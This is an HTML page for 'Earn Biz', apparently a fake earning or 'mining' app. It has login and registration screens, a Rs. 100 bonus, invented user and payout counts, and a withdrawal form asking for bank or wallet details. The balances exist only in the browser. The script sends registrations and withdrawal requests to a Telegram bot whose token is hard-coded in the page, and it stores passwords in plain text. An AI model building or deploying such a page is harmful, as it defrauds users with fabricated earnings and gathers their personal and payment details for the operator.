<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earn Biz | Official V25 Ultra Premium</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #00ff88; --primary-glow: rgba(0, 255, 136, 0.4); --bg: #020617; --card-bg: rgba(15, 23, 42, 0.7); --border: rgba(255, 255, 255, 0.1); --text: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
        .container { padding: 20px; max-width: 450px; margin: auto; padding-bottom: 120px; }
        .hidden { display: none !important; }
        
        /* Auth */
        .auth-screen { position: fixed; inset: 0; background: var(--bg); z-index: 30000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; }
        .input-group { background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 18px; padding: 15px; margin-bottom: 12px; width: 100%; max-width: 350px; display: flex; align-items: center; }
        .input-group input { background: transparent; border: none; color: white; width: 100%; margin-left: 10px; outline: none; }
        
        /* Dashboard UI */
        .glass-card { background: var(--card-bg); backdrop-filter: blur(15px); border: 1px solid var(--border); border-radius: 28px; padding: 20px; margin-bottom: 15px; }
        .wallet-card { background: linear-gradient(135deg, #0f172a 0%, #020617 100%); border: 1px solid var(--primary); text-align: center; padding: 30px; }
        .btn { width: 100%; padding: 18px; border-radius: 20px; border: none; background: linear-gradient(45deg, #008f51, #00ff88); color: #020617; font-weight: 800; cursor: pointer; }
        
        nav { position: fixed; bottom: 25px; left: 20px; right: 20px; background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(20px); padding: 12px; display: flex; justify-content: space-around; border-radius: 35px; border: 1px solid var(--border); z-index: 1000; }
        .nav-item { color: #64748b; font-size: 11px; text-align: center; cursor: pointer; }
        .nav-item.active { color: var(--primary); font-weight: 800; }
    </style>
</head>
<body>

<div id="auth-wrapper">
    <div id="login-screen" class="auth-screen">
        <h2>Login</h2>
        <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="l-email" placeholder="Email"></div>
        <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="l-pass" placeholder="Password"></div>
        <button class="btn" onclick="handleLogin()">LOGIN</button>
        <p style="margin-top:20px;">No account? <span onclick="showAuth('reg')" style="color:var(--primary); cursor:pointer;">Register</span></p>
    </div>
    <div id="register-screen" class="auth-screen hidden">
        <h2>Register</h2>
        <div class="input-group"><input type="text" id="r-name" placeholder="Name"></div>
        <div class="input-group"><input type="tel" id="r-phone" placeholder="Phone"></div>
        <div class="input-group"><input type="email" id="r-email" placeholder="Email"></div>
        <div class="input-group"><input type="password" id="r-pass" placeholder="Password"></div>
        <button class="btn" onclick="handleRegister()">CREATE ACCOUNT</button>
        <p style="margin-top:20px;">Already member? <span onclick="showAuth('login')" style="color:var(--primary); cursor:pointer;">Login</span></p>
    </div>
</div>

<div id="main-app" class="hidden">
    <div class="container">
        <div id="home-view" class="page">
            <div class="header" style="display:flex; justify-content:space-between; margin-bottom:15px;">
                <div style="font-weight:800; font-size:24px;">EARN<span style="color:var(--primary);">BIZ</span></div>
                <div id="u-id" style="opacity:0.6; font-size:12px;">ID: --</div>
            </div>

            <div id="bonus-notice" class="glass-card" style="border-left:5px solid #ffd700; background:rgba(255,215,0,0.1);">
                <b>Welcome Bonus! 🎁</b><br>Claim your Rs. 100.00 reward now.
                <button onclick="claimBonus()" class="btn" style="margin-top:10px; padding:10px;">CLAIM</button>
            </div>

            <div class="glass-card" style="border-left:5px solid #229ED9;">
                <b>🚀 Official Community</b><br>Join Telegram for daily updates.
                <a href="https://t.me/Earnbize_Official" target="_blank" style="color:#229ED9; display:block; margin-top:5px; font-weight:bold;">JOIN NOW</a>
            </div>

            <div class="glass-card wallet-card">
                <small>TOTAL BALANCE</small>
                <h1 id="bal-disp">Rs. 0.00</h1>
            </div>

            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                <div class="glass-card">Active Users<br><b style="color:var(--primary);">34,501+</b></div>
                <div class="glass-card">Payouts<br><b style="color:var(--primary);">12,840+</b></div>
            </div>
            
            <div class="glass-card" style="text-align:center;">
                <div id="mining-anim"><i class="fas fa-microchip fa-spin" style="color:var(--primary); font-size:30px;"></i></div>
                <h2 id="profit-disp" style="color:var(--primary); margin:10px 0;">Rs. 0.0000</h2>
            </div>
        </div>

        <div id="payout-view" class="page hidden">
            <h3>Withdraw</h3>
            <div class="glass-card">
                <input type="number" id="w-amt" placeholder="Amount" style="width:100%; background:transparent; border:1px solid var(--border); padding:10px; color:white; border-radius:10px;">
                <input type="text" id="w-details" placeholder="Wallet/Bank Details" style="width:100%; background:transparent; border:1px solid var(--border); padding:10px; color:white; border-radius:10px; margin:10px 0;">
                <button class="btn" onclick="requestWithdraw()">SUBMIT</button>
            </div>
        </div>
    </div>

    <nav>
        <div class="nav-item active" onclick="showPage('home-view', this)"><i class="fas fa-home"></i><br>Home</div>
        <div class="nav-item" onclick="showPage('payout-view', this)"><i class="fas fa-wallet"></i><br>Payout</div>
    </nav>
</div>

<script>
    const BOT_TOKEN = '8694970193:AAHsaReax1HRxxcKxZaK6pjLpc7gYm5jNAY';
    const ADMIN_CHAT_ID = '8375861033';
    let user = JSON.parse(localStorage.getItem('eb_user')) || null;
    let state = { bal: 0, profit: 0, rate: 0 };

    async function notifyAdmin(msg) { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }

    function showAuth(t) {
        document.getElementById('login-screen').classList.toggle('hidden', t !== 'login');
        document.getElementById('register-screen').classList.toggle('hidden', t !== 'reg');
    }

    function handleRegister() {
        const name = document.getElementById('r-name').value;
        const userData = { name, email: document.getElementById('r-email').value, pass: document.getElementById('r-pass').value, id: "EB"+Math.floor(1000+Math.random()*9000), bal: 0 };
        localStorage.setItem('eb_user', JSON.stringify(userData));
        notifyAdmin(`🆕 Registration: ${name}`);
        location.reload();
    }

    function handleLogin() {
        const stored = JSON.parse(localStorage.getItem('eb_user'));
        if(stored && stored.email === document.getElementById('l-email').value) {
            user = stored;
            initApp();
        } else alert("Invalid Login");
    }

    function claimBonus() {
        user.bal += 100;
        localStorage.setItem('eb_user', JSON.stringify(user));
        document.getElementById('bonus-notice').classList.add('hidden');
        updateUI();
    }

    function requestWithdraw() {
        const amt = document.getElementById('w-amt').value;
        if(user.bal >= amt) {
            user.bal -= amt;
            notifyAdmin(`💰 Withdrawal: Rs.${amt} by ${user.name}`);
            updateUI();
        }
    }

    function initApp() {
        document.getElementById('auth-wrapper').classList.add('hidden');
        document.getElementById('main-app').classList.remove('hidden');
        state.bal = user.bal;
        document.getElementById('u-id').innerText = "ID: " + user.id;
        updateUI();
    }

    function updateUI() {
        document.getElementById('bal-disp').innerText = "Rs. " + state.bal.toFixed(2);
        document.getElementById('profit-disp').innerText = "Rs. " + state.profit.toFixed(4);
    }

    function showPage(id, el) {
        document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    window.onload = () => { if(user) initApp(); }
</script>
</body>
</html>
